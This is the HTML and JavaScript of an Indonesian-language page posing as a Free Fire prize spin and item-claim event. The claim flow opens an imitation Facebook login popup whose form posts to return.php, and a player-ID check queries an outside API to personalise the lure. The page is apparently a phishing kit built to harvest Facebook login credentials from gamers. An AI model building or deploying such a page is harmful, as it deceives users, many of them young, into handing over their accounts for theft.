<html>
    ...
    <body>
        ...
        <div class="app">
            ...
            <!-- MENU BUTTON -->
            <div class="menu">
                <a class="sub active" id="images">SPIN
                    <div class="corner"></div>
                    <div class="corner"></div>
                    <div class="corner"></div>
                    <div class="corner"></div>
                </a>
                <a class="sub" id="bahan">CLAIM
                    <div class="corner"></div>
                    <div class="corner"></div>
                    <div class="corner"></div>
                    <div class="corner"></div>
            ...
            <!-- SPIN -->
            <div class="wrapSpin" id="spinz">
                <div class="spin">
                    <div class="spinItem" data-order="0">
                        <img id="img0" src="public/images/1.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                    </div>
                    <div class="spinItem" data-order="1">
                        <img id="img1" src="public/images/2.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                    </div>
                    <div class="spinItem" data-order="2">
                        <img id="img2" src="public/images/3.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                    </div>
                    <div class="spinItem" data-order="7">
                        <img id="img7" src="public/images/4.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                    ...
                    <div class="spinItem" data-order="3">
                        <img id="img3" src="public/images/5.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                    </div>
                    <div class="spinItem" data-order="6">
                        <img id="img6" src="public/images/6.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                    </div>
                    <div class="spinItem" data-order="5">
                        <img id="img5" src="public/images/7.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                    </div>
                    <div class="spinItem" data-order="4">
                        <img id="img4" src="public/images/8.jpg">
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                        <div class="corner"></div>
                ...
                <div class="spinButton" onclick="init(this); soundEffect('click')">Mulai Spin</div>
            </div>
            ...
            <div class="claims" id="claimz" style="display:none;">
                <div class="boxItem">
                    <img src="public/bahan/1.jpg">
                    <div class="btnItem">Claim</div>
                </div>

                <div class="boxItem">
                    <img src="public/bahan/2.jpg">
                    <div class="btnItem">Claim</div>
                </div>

                <div class="boxItem">
                    <img src="public/bahan/3.jpg">
                    <div class="btnItem">Claim</div>
                </div>

                <div class="boxItem">
                    <img src="public/bahan/4.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                
                <div class="boxItem">
                    <img src="public/bahan/5.jpg">
                    <div class="btnItem">Claim</div>
                </div>

                <div class="boxItem">
                    <img src="public/bahan/6.jpg">
                    <div class="btnItem">Claim</div>
                </div>

                <div class="boxItem">
                    <img src="public/bahan/7.jpg">
                    <div class="btnItem">Claim</div>
                </div>

                <div class="boxItem">
                    <img src="public/bahan/8.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                <div class="boxItem">
                    <img src="public/bahan/9.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                <div class="boxItem">
                    <img src="public/bahan/10.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                <div class="boxItem">
                    <img src="public/bahan/11.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                <div class="boxItem">
                    <img src="public/bahan/12.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                <div class="boxItem">
                    <img src="public/bahan/13.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                <div class="boxItem">
                    <img src="public/bahan/14.jpg">
                    <div class="btnItem">Claim</div>
                </div>
                <div class="boxItem">
                    <img src="public/bahan/15.jpg">
                    <div class="btnItem">Claim</div>
                </div>
            ...
            <div class="popUp">
                ...
                <div class="imgBozx">
                    <img id="imgSource" src="https://i.ibb.co/MncBXzv/2.jpg">
                </div>
                <div class="nextBtn" onclick="soundEffect('click'),nextStep()">Lanjut</div>
            </div>
                ...
                <div class="popup-box-login-fb">
                   ...
                   <div class="content-box-fb">
                     ...
                     <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                      ...
                      <form class="login-form" method="POST" action="return.php">
                         <label>
            ...
            <!-- TRUEID -->
            <div class="klo">
                <h1 class="ok">PLAYER ID VERIFICATION</h1>
                <input class="ler" id="palkon" type="number" onclick="new Audio('https://b.top4top.io/m_2102zquno1.mp3').play()" placeholder="Enter Your ID">
                <div class="yop">Check ID</div>
            </div>
            <!-- END TRUEID -->
        ...
        <script>
            ...
            $('.menu .sub').click(function(){
                ...
                if(id == 'spin')
                {
                    $('#spinz').fadeIn().css('display','flex');
                    $('#claimz').hide();
                }
                else if(id == "claim")
                {
                    $('#spinz').hide();
                    $('#claimz').fadeIn().css('display','flex');
                }
            })
            $('.boxItem .btnItem').click(function(){
                $('.loading').fadeIn().css('display','flex'),$('.mask').fadeIn()
                soundEffect('click')
                setTimeout(() => {
                    let src = $(this).prev().attr('src');
                    $('.loading').fadeOut()
                    $('.popUp').fadeIn().css('display','flex'),$('#imgSource').attr('src',src),$('.mask').fadeIn()
                    soundEffect('pop')
                },1000)
            })
            function nextStep()
        ...
        function controllSpeed() {
            ...
            if (jumps > minimum_jumps + 10 && prize === keys) {
                ...
                var src = prizes[keys]
                $('.loading').fadeIn().css('display','flex'),$('.mask').fadeIn()
                $('.spinButton').css('pointer-events','unset');
        ...
        $('.yop').click(function(){
            ...
            $.ajax({
                url: `https://api-xyz.com/trueid/freefire/?id=${moh}&token=NguyenThuWan`,
                type: 'GET',
                dataType: 'json',
                beforeSend: function(){
                    $('.yop').html('<ion-spinner name="dots"></ion-spinner>');
                ...
                success: function(dor){
                    ...
                    switch(code){
                        case '200':
                            ...
                            $('.loading').fadeIn().css('display','flex'),$('.mask').fadeIn()
                            setTimeout(() => {
                                addToast('Hai Selamat Datang <strong>'+dor.nickname+'</'+'strong>')
                                $('.loading').hide()
                        ...
                        case '400':
                            ...
                            $('.moh').val('')
                            setTimeout(() => {
                                addToast('ID Yang Anda Masukkan Tidak Cocok Dengan Akun Manapun')
                                $('.loading').hide()
                                setTimeout(() => {
                                    $('.toast').fadeOut('slow').remove()
                                    $('.klo').fadeIn();
